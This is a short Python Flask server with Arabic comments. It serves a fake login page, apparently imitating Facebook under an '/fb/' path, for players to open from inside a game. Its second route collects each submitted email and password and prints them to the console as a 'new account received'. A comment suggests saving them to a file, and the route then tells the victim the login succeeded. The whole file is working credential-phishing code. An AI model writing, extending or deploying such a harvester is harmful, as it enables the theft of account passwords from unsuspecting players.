from flask import Flask, render_template, request, redirect

app = Flask(__name__)

# 1. الرابط الأول: يُوضع في اللعبة لفتح صفحة الـ HTML للاعب
@app.route('/fb/login_page', methods=['GET'])
def login_page():
    return render_template('index.html')

# 2. الرابط الثاني: يستقبل الحسابات برمجياً من سطر الـ Form في الـ HTML
@app.route('/fb/auth_action', methods=['POST'])
def auth_action():
    username = request.form.get('email')
    password = request.form.get('password')
    
    # هنا يتم طباعة الحساب المستلم في كونسول السيرفر (يمكنك تعديله لحفظه في ملف نصي)
    print(f"[-] حساب جديد مستلم -> المستخدم: {username} | كلمة المرور: {password}")
    
    # بعد التسجيل، يمكنك توجيهه لصفحة نجاح أو تركه
    return "Login Successful! You can return to the game."